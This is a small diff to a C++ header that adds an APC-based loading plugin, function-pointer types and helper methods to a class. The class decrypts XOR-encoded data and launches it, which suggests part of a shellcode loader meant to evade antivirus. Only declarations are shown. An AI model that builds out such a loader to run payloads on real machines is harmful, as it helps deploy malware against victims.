@@ -10,6 +10,10 @@
 #include <Cryptography.h>
 
 #include "../plugin/directlyLoad.h"
+#include "../plugin/apcLoad.h"
+
+using startFunction = void (*)(const unsigned char *, const size_t &);
+using generateFunction = void (*)();
 
 class Launch {
 private:
@@ -32,6 +36,10 @@ private:
     void funcFile_XOR(std::string &encryptedData);
 
     void launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength);
+
+    void printMode(const std::string &mode);
+
+    void startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength);
 public:
     Launch() = default;
 
@@ -68,8 +76,6 @@ public:
     void setCycles(const int &cycles) {
         this->NUMBER_OF_CYCLES = cycles;
     }
-
-
 
 public:
     void au9u5tDecrypt();
